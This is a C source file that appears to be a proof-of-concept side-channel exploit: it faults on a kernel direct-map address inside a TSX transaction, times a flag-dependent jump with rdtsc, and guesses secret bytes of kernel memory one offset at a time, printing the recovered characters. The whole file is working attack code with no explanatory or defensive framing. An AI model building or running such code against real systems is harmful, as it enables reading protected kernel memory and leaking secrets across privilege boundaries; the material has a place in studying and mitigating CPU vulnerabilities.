#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#include "cacheutils.h"

#define FROM 'A'
#define TO 'Z'

uint64_t start_time, spend_time;
static int hist[256];
unsigned int pid = 0;

int main(int argc, char *argv[])
{
    unsigned char argmax;
    size_t secret_addr, len = 10, try_times = 3000;
    uint64_t max_time, min_time;
    int i, offset, max_i, max_i_index;

    secret_addr = strtoull(argv[1], NULL, 0);
    secret_addr += 0xffff888000000000;
    if (argc > 2)
    {
        len = atoi(argv[2]);
    }

    for (offset = 0; offset < len; offset++)
    {
        for (i = 0; i < 256; i++)
        {
            hist[i] = 0;
        }

        for (i = 0; i < try_times; i++)
        {
            max_time = 0;
            min_time = 0xffffffff;
            int time_sum = 0;
            for (uint8_t test_num = 0; test_num <= TO; test_num++)
            {
                // start_time = __rdtscp(&pid);
                start_time = __rdtsc();
                asm volatile(
                    "MOV %0, %%RCX;"
                    "MOV %1, %%BL;"
                    :
                    : "r"(secret_addr + offset),
                      "r"(test_num)
                    :);
                if (xbegin() == (~0u))
                {
                    asm volatile("SUB %BL, (%RCX);");
                }
                asm volatile(
                    // "lahf;"
                    // "sahf;"
                    // "pushf;"
                    // "popf;"
                    "jz equal;"
                    "jmp notequal;"
                    "equal: nop;"
                    "notequal: nop;");
                spend_time = __rdtsc() - start_time;
                // mfence();
                if (max_time < spend_time)
                    max_time = spend_time, argmax = test_num;
                if (min_time > spend_time)
                    min_time = spend_time;
                time_sum += spend_time;
            }

            hist[argmax]++;
        }

        max_i = -1;
        for (i = 'A'; i < 'z'; i++)
        {
            if (max_i < hist[i])
            {
                max_i = hist[i];
                max_i_index = i;
            }
        }

        printf("offset: %2d ", offset);
        printf("max_i: %3d max_i_index: %3c max_time: %4ld, min_time: %4ld\n", max_i, (char)max_i_index, max_time, min_time);
    }
}